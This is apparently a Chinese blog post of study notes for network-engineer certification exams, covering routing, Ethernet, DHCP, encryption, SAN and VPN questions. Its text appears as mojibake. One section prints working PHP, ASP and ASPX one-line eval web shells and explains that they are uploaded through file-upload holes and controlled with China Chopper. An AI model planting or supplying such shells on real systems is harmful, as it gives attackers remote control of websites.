    <url>/2023/05/15/net/%E3%80%90%E8%BD%AF%E8%80%83%E3%80%91%E7%9C%9F%E9%A2%98%E9%97%AE%E9%A2%98%E5%8F%8A%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="â€”â€”â€”-å¤ä¹ ç¬”è®°-â€”â€”â€”"><a href="#â€”â€”â€”-å¤ä¹ ç¬”è®°-â€”â€”â€”" class="headerlink" title="â€”â€”â€”- å¤ä¹ ç¬”è®° â€”â€”â€”-"></a>â€”â€”â€”- å¤ä¹ ç¬”è®° â€”â€”â€”-</h2><h2 id="å¤ä¹ ç¬”è®°-20230516-äºŒ"><a href="#å¤ä¹ ç¬”è®°-20230516-äºŒ" class="headerlink" title="å¤ä¹ ç¬”è®° 20230516(äºŒ)"></a>å¤ä¹ ç¬”è®° 20230516(äºŒ)</h2><h3 id="è·¯ç”±åè®®"><a href="#è·¯ç”±åè®®" class="headerlink" title="è·¯ç”±åè®®"></a>è·¯ç”±åè®®</h3><p>RIP    udp 520<br>OSPF ip<br>ISIS   é“¾è·¯å±‚<br>BGP   tcp 179</p><p>ospfå’Œisis é“¾è·¯çŠ¶æ€åè®®</p><p>ospfä½¿ç”¨helloæŠ¥æ–‡ç»´æŒé‚»å±…å…³ç³»<br>isisä¹Ÿä½¿ç”¨helloåè®®å¯»æ‰¾æ¯—é‚»èŠ‚ç‚¹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/8ed4ac6bc9b0a887ee1fc045c72599f.jpg" alt="8ed4ac6bc9b0a887ee1fc045c72599f.jpg"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/39d7dadafe12fa58cfbbf92191df6a5.jpg" alt="8ed4ac6bc9b0a887ee1fc045c72599f.jpg"></p><h2 id="â€”â€”â€”-ä¸Šåˆé¢˜-â€”â€”â€”"><a href="#â€”â€”â€”-ä¸Šåˆé¢˜-â€”â€”â€”" class="headerlink" title="â€”â€”â€”- ä¸Šåˆé¢˜ â€”â€”â€”-"></a>â€”â€”â€”- ä¸Šåˆé¢˜ â€”â€”â€”-</h2><h2 id="2019å¹´5æœˆä¸Šåˆé¢˜-20230513-å…­-65-x2F-75"><a href="#2019å¹´5æœˆä¸Šåˆé¢˜-20230513-å…­-65-x2F-75" class="headerlink" title="2019å¹´5æœˆä¸Šåˆé¢˜  20230513(å…­)  65&#x2F;75"></a>2019å¹´5æœˆä¸Šåˆé¢˜  20230513(å…­)  65&#x2F;75</h2><h2 id="2019å¹´11æœˆä¸Šåˆé¢˜-20230515-ä¸€-59-x2F-75"><a href="#2019å¹´11æœˆä¸Šåˆé¢˜-20230515-ä¸€-59-x2F-75" class="headerlink" title="2019å¹´11æœˆä¸Šåˆé¢˜  20230515(ä¸€)  59&#x2F;75"></a>2019å¹´11æœˆä¸Šåˆé¢˜  20230515(ä¸€)  59&#x2F;75</h2><p>06<br>ä¸€èˆ¬æƒ…å†µä¸‹å±äºèŒåŠ¡ä½œå“ï¼ŒæŒ‰å›½å®¶è‘—ä½œæƒæ³•è§„å®šï¼Œåº”å±äºå•ä½æ‰€æœ‰ã€‚ä½†å¦‚æœä¸å•ä½äº‹å…ˆæœ‰ç‰¹åˆ«çº¦å®šï¼Œåº”éµä»çº¦å®š</p><p>07<br>è½¯ä»¶å¼€å‘è€…æ‹¥æœ‰ç½²åæƒï¼Œå…¶ä»–è‘—ä½œæƒå½’å±å•ä½</p><p>08<br>åœ¨ç£ç›˜è°ƒåº¦ç®¡ç†ä¸­ï¼Œåº”å…ˆè¿›è¡Œç§»è‡‚è°ƒåº¦ï¼Œå†è¿›è¡Œæ—‹è½¬è°ƒåº¦ã€‚ ï¼Ÿï¼Ÿï¼Ÿ</p><p>12<br>ä¼ ç»Ÿä»¥å¤ªç½‘ä½¿ç”¨çš„æ˜¯<u>æ›¼å½»æ–¯ç‰¹ç¼–ç </u>ï¼Œæ•ˆç‡50%</p><p>13 14<br>HFCæ˜¯å°†<u>å…‰ç¼†</u>æ•·è®¾åˆ°å°åŒºï¼Œç„¶åé€šè¿‡å…‰ç”µè½¬æ¢ç»“ç‚¹ï¼Œåˆ©ç”¨æœ‰çº¿ç”µè§†CATVçš„æ€»çº¿å¼<u>åŒè½´ç”µç¼†</u>è¿æ¥åˆ°ç”¨æˆ·ï¼Œæä¾›ç»¼åˆç”µä¿¡ä¸šåŠ¡çš„æŠ€æœ¯ã€‚</p><p>15 åƒå…†ä»¥å¤ªç½‘<br>(1)1000 Base-Tæ ‡å‡†ä½¿ç”¨çš„æ˜¯5ç±»éå±è”½åŒç»çº¿ï¼ŒåŒç»çº¿é•¿åº¦å¯ä»¥è¾¾åˆ°100mã€‚<br>(2)1000Base-Xæ˜¯åŸºäºå…‰çº¤é€šé“çš„ç‰©ç†å±‚ï¼Œä½¿ç”¨çš„åª’ä½“æœ‰ä¸‰ç§ï¼š<br>1000 Base-CXæ ‡å‡†ä½¿ç”¨çš„æ˜¯å±è”½åŒç»çº¿ï¼ŒåŒç»çº¿é•¿åº¦å¯ä»¥è¾¾åˆ°25mï¼›<br>1000 Base-LXæ ‡å‡†ä½¿ç”¨çš„æ˜¯æ³¢é•¿ä¸º1300nmçš„å•æ¨¡å…‰çº¤ï¼Œå…‰çº¤é•¿åº¦å¯ä»¥è¾¾åˆ°3 000mï¼›<br>1000 Base-SXæ ‡å‡†ä½¿ç”¨çš„æ˜¯æ³¢é•¿ä¸º850nmçš„å¤šæ¨¡å…‰çº¤ï¼Œå…‰çº¤é•¿åº¦å¯ä»¥è¾¾åˆ°300ï½550mã€‚<br>å…¶ä¸­å‰ä¸‰é¡¹æ ‡å‡†æ˜¯IEEE 802.3zï¼Œè€Œ1000 Base-Tçš„æ ‡å‡†æ˜¯IEEE 802.3abã€‚</p><p>16 CRC<br>åœ¨åŸå§‹æŠ¥æ–‡çš„åé¢æ·»åŠ è‹¥å¹²ä¸ª0 (ç”Ÿæˆå¤šé¡¹å¼çš„æœ€é«˜æ¬¡å¹‚æ•° æœ€ç»ˆæ ¡éªŒä½çš„ä½æ•°)</p><p>17 CSMA&#x2F;CD<br>åœ¨ä»¥å¤ªç½‘ä¸­ä¸ºäº†ç¡®ä¿å‘é€æ•°æ®ç«™ç‚¹åœ¨ä¼ è¾“æ—¶èƒ½æ£€æµ‹åˆ°å¯èƒ½å­˜åœ¨çš„å†²çªï¼Œæ•°æ®å¸§çš„ä¼ è¾“æ—¶å»¶è¦ä¸å°äºä¸¤å€çš„ä¼ æ’­æ—¶å»¶ã€‚<br>$$\displaystyle ä¼ è¾“æ—¶å»¶ \geq 2\times\frac{ä»»æ„ä¸¤ç‚¹é—´çš„æœ€é•¿è·ç¦»}{ä¿¡å·ä¼ æ’­é€Ÿåº¦}$$</p><p>19 20  HDLC<br>_HDLC_ï¼ˆHigh-Level Data Link Controlï¼Œé«˜çº§æ•°æ®é“¾è·¯æ§åˆ¶ï¼‰<br>HDLCæœ‰ä¸‰ç§ä¸åŒç±»å‹çš„å¸§ï¼šä¿¡æ¯å¸§(Iå¸§)ã€ç›‘æ§å¸§(Så¸§)å’Œæ— ç¼–å·å¸§(Uå¸§)ã€‚<br>ä¿¡æ¯å¸§ç”¨äºä¼ é€ç”¨æˆ·æ•°æ®ã€é€šå¸¸ç®€ç§°ï¼©å¸§ã€‚<br>ç›‘æ§å¸§ç”¨æ¥å·®é”™æ§åˆ¶å’Œæµé‡æ§åˆ¶ï¼Œ<br>æ— ç¼–å·å¸§ç”¨äºæä¾›å¯¹é“¾è·¯çš„å»ºç«‹ã€æ‹†é™¤ä»¥åŠå¤šç§æ§åˆ¶åŠŸèƒ½ã€‚</p><p>21<br>å‘é€æ–¹çš„æ‹¥å¡çª—å£cwnd</p><p>26<br>OSPFæŠ¥æ–‡å°è£…åœ¨IPåŒ…ä¸­ï¼Œåè®®å·89<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230515200249.png" width="50%" height="50%"><br>29<br>1ã€æˆ‘å‘æµè§ˆå™¨ä¸­è¾“å…¥ç½‘å€åï¼Œæµè§ˆå™¨ä¼šæ•ˆéªŒç½‘å€çš„åˆæ³•æ€§ï¼Œå¦‚æœç½‘å€ä¸åˆæ³•ï¼Œä¼šä¼ ç»™é»˜è®¤çš„æœç´¢å¼•æ“ã€‚<br>å¦‚æœç½‘å€åˆæ³•å¹¶é€šè¿‡éªŒè¯ï¼Œæµè§ˆå™¨ä¼šï¼Œå¾—åˆ°åè®®(httpæˆ–https)ï¼ŒåŸŸåï¼Œèµ„æºé¡µé¢(æ¯”å¦‚é¦–é¢ç­‰)<br>2ã€DNSæŸ¥è¯¢<br>æµè§ˆå™¨ä¼šå…ˆæ£€æŸ¥åŸŸåä¿¡æ¯æ˜¯å¦åœ¨ç¼“å­˜ä¸­ã€‚<br>å†æ£€æŸ¥åŸŸåæ˜¯å¦åœ¨æœ¬åœ°çš„Hostsæ–‡ä»¶ä¸­ã€‚<br>å¦‚æœè¿˜ä¸åœ¨ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå‘DNSæœåŠ¡å™¨å‘é€ä¸€ä¸ªæŸ¥è¯¢è¯·æ±‚ï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„IPåœ°å€ã€‚<br>3ã€TCPå°åŒ…åŠä¼ è¾“<br>4ã€å»ºç«‹TCPè¿æ¥åå‘èµ·HTTPè¯·æ±‚                             ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br>5ã€æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å¹¶ç›¸åº”</p><p>33<br>å…³é—­é˜²ç«å¢™çš„æ–¹æ³•ä¸ºï¼š</p><ol><li>æ°¸ä¹…æ€§ç”Ÿæ•ˆ<br>å¼€å¯ï¼šchkconfig iptables on<br>å…³é—­ï¼šchkconfig iptables off</li><li>å³æ—¶ç”Ÿæ•ˆï¼Œé‡å¯åå¤±æ•ˆ<br>å¼€å¯ï¼šservice iptables start<br>å…³é—­ï¼šservice iptables stop</li></ol><p>34<br>IISï¼ˆInternet Information Serverï¼Œäº’è”ç½‘ä¿¡æ¯æœåŠ¡ï¼‰æ˜¯ä¸€ç§Webï¼ˆç½‘é¡µï¼‰æœåŠ¡ç»„ä»¶</p><ul><li>DHCPæœåŠ¡å™¨</li><li>DNS æœåŠ¡å™¨</li><li>ä¼ çœŸæœåŠ¡å™¨</li><li>WebæœåŠ¡å™¨(IIS)<br>- WebæœåŠ¡å™¨    ç½‘é¡µæµè§ˆ<br>- FTPæœåŠ¡å™¨     æ–‡ä»¶ä¼ è¾“<br>- NNTPæœåŠ¡å™¨  æ–°é—»æœåŠ¡<br>- SMTPæœåŠ¡å™¨   é‚®ä»¶å‘é€</li></ul><p>36<br>DHCPæœåŠ¡å¯ä»¥æœåŠ¡äºä¸€ä¸ªç½‘æ®µï¼Œä¹Ÿå¯ä»¥é€šè¿‡DHCPä¸­ç»§æœåŠ¡å¤šä¸ªå­ç½‘ï¼Œåœ¨ä¸€ä¸ªç½‘æ®µä¸­å¯ä»¥é…ç½®å¤šå°DHCPæœåŠ¡å™¨ã€‚<br>å®¢æˆ·ç«¯è¦ä½¿ç”¨DHCPæœåŠ¡ä¸éœ€æŒ‡å®šDHCPæœåŠ¡å™¨åœ°å€ï¼Œæ˜¯é€šè¿‡å¹¿æ’­æ–¹å¼å¯»æ‰¾</p><p>41<br>å…¬å¼€å¯†é’¥åŠ å¯†ï¼Œä¹Ÿå«éå¯¹ç§°åŠ å¯†ï¼ŒåŠ å¯†ç”¨åˆ°ä¸¤ä¸ªå¯†é’¥ï¼Œå…¶ä¸­å…¬å¼€çš„æ˜¯å…¬é’¥ï¼Œæœªå…¬å¼€çš„æ˜¯ç§é’¥ï¼Œä¸€ä¸ªç”¨æ¥åŠ å¯†ï¼Œå¦ä¸€ä¸ªç”¨æ¥è§£å¯†ã€‚å¸¸è§çš„éå¯¹ç§°åŠ å¯†ç®—æ³•æœ‰RSAã€ElGamalã€DSAã€ECCï¼ˆæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•èƒŒåŒ…ç®—æ³•ï¼‰ç­‰ã€‚<br>å¯¹ç§°åŠ å¯†åªç”¨ä¸€ä¸ªå¯†é’¥ï¼Œæ—¢åšåŠ å¯†åˆåšè§£å¯†ã€‚å¸¸è§çš„å¯¹ç§°åŠ å¯†ç®—æ³•æœ‰ï¼šDESã€AESã€3DESã€Blowfishç­‰ã€‚</p><p>58<br>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¿¡æ¯æ’åº§çš„å®‰è£…ä½ç½®è·ç¦»åœ°é¢çš„é«˜åº¦ä¸º( )cm  30-50<br>ä¸€èˆ¬30cmï¼Œå¯ä»¥å›å¿†ä¸‹å®¶é‡Œç½‘çº¿å£é«˜åº¦æ˜¯å¤šå°‘</p><p>61<br>é€‰æ ¹ç½‘æ¡¥é‚£ä¸ªé¢˜ï¼Œæœ‰æ­§ä¹‰</p><p>62<br>RIPv1  RIPv2 æœ‰ç±»ä¸æºå¸¦å­ç½‘æ©ç  æ— ç±»æºå¸¦å­ç½‘æ©ç  ä¸æ”¯æŒVLSMã€CIDR æ”¯æŒVLSMã€CIDR æ²¡æœ‰è®¤è¯åŠŸèƒ½ æä¾›æ˜æ–‡å’ŒMD5è®¤è¯ å¹¿æ’­æ›´æ–° ç»„æ’­æ›´æ–°(å¹¿æ’­ä¹Ÿæ”¯æŒ) å‘¨æœŸæ€§æ›´æ–°30s é‡‡ç”¨è§¦å‘æ›´æ–°</p><p>66<br>å›ºæ€ç¡¬ç›˜æ²¡æœ‰IDEæ¥å£çš„ï¼Œå¸¸è§çš„æœ‰ï¼šSATAã€PCIeå’ŒM.2ã€‚</p><h2 id="2022å¹´5æœˆä¸Šåˆé¢˜"><a href="#2022å¹´5æœˆä¸Šåˆé¢˜" class="headerlink" title="2022å¹´5æœˆä¸Šåˆé¢˜"></a>2022å¹´5æœˆä¸Šåˆé¢˜</h2><h2 id="â€”â€”â€”-ä¸‹åˆé¢˜-â€”â€”â€”"><a href="#â€”â€”â€”-ä¸‹åˆé¢˜-â€”â€”â€”" class="headerlink" title="â€”â€”â€”- ä¸‹åˆé¢˜ â€”â€”â€”-"></a>â€”â€”â€”- ä¸‹åˆé¢˜ â€”â€”â€”-</h2><h2 id="2019å¹´11æœˆä¸‹åˆé¢˜-20230516-äºŒ"><a href="#2019å¹´11æœˆä¸‹åˆé¢˜-20230516-äºŒ" class="headerlink" title="2019å¹´11æœˆä¸‹åˆé¢˜  20230516(äºŒ)"></a>2019å¹´11æœˆä¸‹åˆé¢˜  20230516(äºŒ)</h2><h3 id="ç¬¬1é¢˜-ipåœ°å€ç›¸å…³-14-x2F-20"><a href="#ç¬¬1é¢˜-ipåœ°å€ç›¸å…³-14-x2F-20" class="headerlink" title="ç¬¬1é¢˜ ipåœ°å€ç›¸å…³ 14&#x2F;20"></a>ç¬¬1é¢˜ ipåœ°å€ç›¸å…³ 14&#x2F;20</h3><h3 id="ç¬¬2é¢˜"><a href="#ç¬¬2é¢˜" class="headerlink" title="ç¬¬2é¢˜"></a>ç¬¬2é¢˜</h3><p>å®ç°æ— çº¿ç½‘ç»œç»Ÿä¸€ç®¡ç†å’Œæ¼«æ¸¸çš„è®¾å¤‡ï¼Œæ˜¯æ— çº¿æ§åˆ¶å™¨ AC<br>å®ç°ç”¨æˆ·ç™»å½•è®¤è¯çš„è®¾å¤‡æ˜¯æ— çº¿è®¤è¯ç³»ç»Ÿï¼ˆå¯èƒ½æ˜¯è½¯ä»¶æˆ–ç¡¬ä»¶ï¼‰<br>å®ç°æ— çº¿APæ¥å…¥å’Œä¾›ç”µçš„è®¾å¤‡æ˜¯POEäº¤æ¢æœº<br>å®ç°é«˜å¯†åº¦ä¼˜åŒ–åæ¥å…¥çš„è®¾å¤‡ä¸ºé«˜å¯†å¸é¡¶å¼AP<br>çœ‹åˆ°X86çº¿ç›’ï¼Œå°±æ˜¯é¢æ¿ä¸ŠAP<br>å…¶ä»–è®¾å¤‡ï¼šé˜²ç«å¢™ã€IDS&#x2F;IPSã€WAFã€æ•°æ®åº“å®¡è®¡ã€FCã€äº¤æ¢æœº</p><p>å®ç°ç½‘ç»œéš”ç¦»æŠ€æœ¯çš„æŠ€æœ¯æœ‰VLANå’ŒACLï¼Œå¦‚æœæ˜¯ACLï¼Œä¸€ç‰ˆä¼šè¯´è®¿é—®æ§åˆ¶<br>å®ç°å®¡è®¡å’Œæ§åˆ¶ï¼Œé˜»æ­¢å¹¶è®°å½•éæ³•è®¿é—®ï¼Œå³<u>ä¸Šç½‘è¡Œä¸ºç®¡ç†</u>è®¾å¤‡</p><p>å­˜å‚¨ç½‘ç»œåŒ…å«IP-SANå’ŒFC-SANã€‚å¦‚æœæ˜¯FC-SANï¼ŒæœåŠ¡å™¨ä¸€ç‰ˆä¼šé…ç½®ä¸¤å—ç½‘å¡ï¼Œä¸€å¼ è¿æ¥FCï¼Œä¸€å¼ è¿æ¥ä»¥å¤ªç½‘ã€‚<br>FC fiber channel å…‰çº¤é€šé“</p><h2 id="2020å¹´11æœˆä¸‹åˆé¢˜-20230520-å…­"><a href="#2020å¹´11æœˆä¸‹åˆé¢˜-20230520-å…­" class="headerlink" title="2020å¹´11æœˆä¸‹åˆé¢˜   20230520(å…­)"></a>2020å¹´11æœˆä¸‹åˆé¢˜   20230520(å…­)</h2><h3 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h3><p>1.ç»„æ’­æŠ¥æ–‡å¯¹æ— çº¿ç½‘ç»œç©ºå£çš„å½±å“ä¸»è¦æœ‰(14) ï¼Œéšç€ä¸šåŠ¡æ•°æ®è½¬å‘çš„æ–¹å¼ä¸åŒ, ç»„æ’­æŠ¥æ–‡çš„æŠ‘åˆ¶åˆ†åˆ« åœ¨ (15)ã€(16) é…ç½®ã€‚<br>(14)æ— çº¿ç©ºå£æ‹¥å¡ (15)ç›´è¿ AP çš„äº¤æ¢æœºæ¥å£ (16) AC çš„æµé‡æ¨¡æ¿ä¸‹ </p><p>ç»„æ’­æŠ¥æ–‡åœ¨ æ— çº¿ç©ºå£æ²¡æœ‰ ACK æœºåˆ¶ä¿éšœï¼Œä¸ºäº†çº¯ç»„æ’­æŠ¥æ–‡èƒ½å¤Ÿç¨³å®šå‘é€ï¼Œé€šå¸¸å¯¹ç»„æ’­è¿›è¡Œé™é€Ÿï¼Œæˆ–å«ç»„æ’­æŠ¥æ–‡æŠ‘ åˆ¶ã€‚ç›´æ¥è½¬å‘æ—¶ï¼Œä¼šåœ¨ AP ç›´è¿äº¤æ¢æœºæ¥å£ä¸Šé…ç½®ï¼Œéš§é“è½¬å‘æ—¶ï¼Œåœ¨ AC çš„æµé‡æ¨¡æ¿ä¸‹é…ç½®ç»„æ’­æŠ¥æ–‡æŠ‘ åˆ¶ã€‚</p><p>2.è¯¥ç½‘ç»œ AP éƒ¨ç½²åœ¨æ¯ä¸€é—´å®¿èˆçš„åŸå› æ˜¯ï¼ˆ17ï¼‰<br>(17)ä¿¡å·ç©¿å¢™ä¼šæœ‰è¾ƒå¤§è¡°å‡ï¼Œå¯¼è‡´å®¿èˆå†…ä¿¡å·å·®ï¼Œæ•…ç›´æ¥å°† AP éƒ¨ç½²åœ¨æ¯ä¸ªæˆ¿é—´ã€‚</p><h3 id="é—®é¢˜2"><a href="#é—®é¢˜2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h3><h4 id="1-ç½‘ç»œæ•…éšœ"><a href="#1-ç½‘ç»œæ•…éšœ" class="headerlink" title="1 ç½‘ç»œæ•…éšœ"></a>1 ç½‘ç»œæ•…éšœ</h4><p>ping 127.0.0.1 ä¸é€šï¼Œè¡¨ç¤ºæ— æ³•è®¿é—®è‡ªå·±çš„ç¯å›åœ°å€ï¼Œä¸€èˆ¬éƒ½æ˜¯ç½‘å¡é©±åŠ¨æ²¡æœ‰æ­£ç¡®å®‰è£…æˆ– ç½‘å¡ TCP&#x2F;IP åè®®æ•…éšœã€‚<br>èƒ½ç™»å½•äº’è”ç½‘å³æ—¶èŠå¤©è½¯ä»¶ï¼Œä½†æ— æ³•æ‰“å¼€ç½‘é¡µï¼Œæ˜¯åŸŸåè§£æçš„é—®é¢˜ï¼Œé€‰æ‹© DNS é…ç½®é”™è¯¯ã€‚</p><h4 id="2-ä¸€å¥è¯æœ¨é©¬"><a href="#2-ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="2 ä¸€å¥è¯æœ¨é©¬"></a>2 ä¸€å¥è¯æœ¨é©¬</h4><p>å…ˆæ¥çœ‹çœ‹æœ€ç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>ã€åŸºæœ¬åŸç†ã€‘åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¾€ç›®æ ‡ç½‘ç«™ä¸­ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åä½ å°±å¯ä»¥åœ¨æœ¬åœ°é€šè¿‡ä¸­å›½èœåˆ€chopper.exeå³å¯è·å–å’Œæ§åˆ¶æ•´ä¸ªç½‘ç«™ç›®å½•ã€‚@è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯ï¼Œä¹Ÿä¸æŠ¥é”™ã€‚evalï¼ˆï¼‰å‡½æ•°è¡¨ç¤ºæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆçš„å…¨éƒ½å½“åšä»£ç æ‰§è¡Œã€‚$_POST[â€˜attackâ€™]è¡¨ç¤ºä»é¡µé¢ä¸­è·å¾—attackè¿™ä¸ªå‚æ•°å€¼ã€‚</p><p>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);?&gt;<br>aspçš„ä¸€å¥è¯æ˜¯ï¼š   &lt;%<span class="hljs-built_in">eval</span> request (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>aspxçš„ä¸€å¥è¯æ˜¯ï¼š  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-built_in">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><h4 id="3-æ”»å‡»æªæ–½"><a href="#3-æ”»å‡»æªæ–½" class="headerlink" title="3 æ”»å‡»æªæ–½"></a>3 æ”»å‡»æªæ–½</h4><p>é’ˆå¯¹ä¸Šè¿°æ”»å‡»ï¼Œåº”è¯¥é‡‡å– ï¼ˆ6ï¼‰ ç­‰æªæ–½è¿›è¡Œé˜²èŒƒã€‚<br>éƒ¨ç½²é˜²ç—…æ¯’ç½‘å…³æˆ–é˜²åƒåœ¾é‚®ä»¶ç³»ç»Ÿï¼Œå¯åŠ¨åº”ç”¨å±‚ç—…æ¯’è¿‡æ»¤</p><h4 id="4-SAN"><a href="#4-SAN" class="headerlink" title="4 SAN"></a>4 SAN</h4><p>å­˜å‚¨åŒºåŸŸç½‘ç»œ(Storage Area Network,ç®€ç§° SAN)å¯åˆ†ä¸ºï¼ˆ7ï¼‰ã€ï¼ˆ8ï¼‰ä¸¤ç§ï¼Œ ä»éƒ¨ç½²æˆæœ¬å’Œä¼ è¾“æ•ˆç‡ä¸¤ä¸ªæ–¹é¢æ¯” è¾ƒè¿™ä¸¤ç§ SANï¼Œæ¯”è¾ƒç»“æœä¸ºï¼ˆ9ï¼‰ã€‚<br>ï¼ˆ7ï¼‰FC-SAN ï¼ˆ8ï¼‰IP-SAN ï¼ˆ9ï¼‰FC-SAN éƒ¨ç½²æˆæœ¬é«˜ï¼Œä¼ è¾“æ•ˆç‡è¾ƒé«˜</p><h4 id="5-raid2-0"><a href="#5-raid2-0" class="headerlink" title="5 raid2.0"></a>5 raid2.0</h4><p>raid2.0æŠ€æœ¯çš„ä¼˜åŠ¿<br>1ã€è‡ªåŠ¨è´Ÿè½½å‡è¡¡ï¼Œé™ä½äº†å­˜å‚¨ç³»ç»Ÿæ•´ä½“æ•…éšœç‡<br>2ã€å¿«é€Ÿç²¾ç®€é‡æ„ï¼Œé™ä½äº†åŒç›˜å¤±æ•ˆç‡å’Œæ•°æ®ä¸¢å¤±çš„é£é™©<br>3ã€æ•…éšœè‡ªæ£€è‡ªæ„ˆï¼Œä¿è¯äº†ç³»ç»Ÿå¯é æ€§<br>4ã€è™šæ‹Ÿæ± åŒ–è®¾è®¡ï¼Œé™ä½å­˜å‚¨è§„åˆ’ç®¡ç†éš¾åº¦</p><h3 id="é—®é¢˜3-IPSec-VPN"><a href="#é—®é¢˜3-IPSec-VPN" class="headerlink" title="é—®é¢˜3 IPSec VPN"></a>é—®é¢˜3 IPSec VPN</h3><p>æ ¡æœ¬éƒ¨ä¸åˆ†æ ¡ä¹‹é—´æ­å»ºäº† IPSec VPNã€‚IPSec çš„åŠŸèƒ½å¯ä»¥åˆ’åˆ†ä¸ºè®¤è¯å¤´ AHã€å°è£…å®‰å…¨è´Ÿ è· ESP ä»¥åŠå¯†é’¥äº¤æ¢ IKEã€‚å…¶ä¸­ç”¨äºæ•°æ®å®Œæ•´æ€§è®¤è¯å’Œæ•°æ®æºè®¤è¯çš„æ˜¯ï¼ˆ1ï¼‰<br>AH ç”¨äºå®Œæ•´æ€§å’Œæ•°æ®æºè®¤è¯ï¼ŒESP ç”¨äºåŠ å¯†ã€‚</p><h3 id="é—®é¢˜4-vlan"><a href="#é—®é¢˜4-vlan" class="headerlink" title="é—®é¢˜4 vlan"></a>é—®é¢˜4 vlan</h3><p>åˆ’åˆ† VLAN çš„æ–¹å¼æœ‰ï¼šåŸºäºæ¥å£ã€åŸºäº MAC åœ°å€ã€åŸºäºå­ç½‘ã€åŸºäºåè®®ã€åŸºäºç­–ç•¥</p><h2 id="2021å¹´5æœˆä¸‹åˆé¢˜-20230522-ä¸€"><a href="#2021å¹´5æœˆä¸‹åˆé¢˜-20230522-ä¸€" class="headerlink" title="2021å¹´5æœˆä¸‹åˆé¢˜   20230522(ä¸€)"></a>2021å¹´5æœˆä¸‹åˆé¢˜   20230522(ä¸€)</h2><h3 id="é—®é¢˜1-1"><a href="#é—®é¢˜1-1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h3><p>VRRPæŠ€æœ¯å®ç°<u>ç½‘å…³å†—ä½™</u>åŠŸèƒ½ï¼Œä¸¤ä¸ªäº¤æ¢æœºä¹‹é—´çš„çº¿ç§°ä¸º<u>å¿ƒè·³çº¿</u>ï¼Œä½œç”¨æ˜¯<u>æ£€æµ‹VRRPç»„çš„çŠ¶æ€ï¼Œå‡ºç°æ•…éšœåŠæ—¶åˆ‡æ¢</u></p><h3 id="é—®é¢˜2-1"><a href="#é—®é¢˜2-1" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h3><p>ä¿éšœæ•°æ®å®‰å…¨å¯ä»¥ä½¿ç”¨VPNéš§é“ï¼Œå¹¶è¿›è¡ŒåŠ å¯†ä¼ è¾“ï¼Œå¸¸ç”¨çš„æ˜¯IPSecåè®®é…åˆESPè¿›è¡ŒåŠ å¯†ã€‚<br>å‡ºå£å¸¦å®½æœ‰é™ï¼Œå¯ä»¥å¢é‡å¤‡ä»½ï¼Œæ¯æ¬¡åªå¤‡ä»½å¢åŠ çš„å†…å®¹ï¼Œèƒ½æœ‰æ•ˆå‡å°‘å¤‡ä»½å®¹é‡ï¼Œæå‡å¤‡ä»½é€Ÿåº¦ã€‚</p><h3 id="é—®é¢˜3"><a href="#é—®é¢˜3" class="headerlink" title="é—®é¢˜3"></a>é—®é¢˜3</h3><p>802.1x ä¸»è¦åœ¨æ¥å…¥äº¤æ¢æœºä¸Šé…ç½®ï¼Œé¢˜ç›®ä¸­æåˆ°ç”±æ¥å…¥äº¤æ¢æœº S1 æ‹¦æˆªç”¨æˆ·æµé‡ï¼Œåˆ™æ˜¯ 802.1xã€‚<br>å¦‚æœæ˜¯ web è®¤è¯ï¼Œç”±é˜²ç«å¢™&#x2F;è¡Œä¸ºç®¡ç†è®¾å¤‡ &#x2F;è®¤è¯ç½‘å…³ç­‰è®¾å¤‡è¿›è¡Œè®¤è¯å¤„ç†<br>å¦‚æœæ˜¯ PPPOE è®¤è¯ï¼Œæ˜¯ç”± BRAS&#x2F;BAS è®¾å¤‡è¿›è¡Œå¤„ç†<br>å¦‚æœæ˜¯çŸ­ä¿¡è®¤è¯ï¼Œéœ€è¦æœ‰çŸ­ä¿¡çŒ«&#x2F;çŸ­ä¿¡ç½‘å…³ã€‚</p><p>å­¦æ ¡å’Œä¼ä¸šé‡‡ç”¨ 802.1x è®¤è¯è¾ƒå¤š<br>å®¶åº­å®½å¸¦&#x2F;ä¸­å°å‹ä¼ä¸šé‡‡ç”¨ 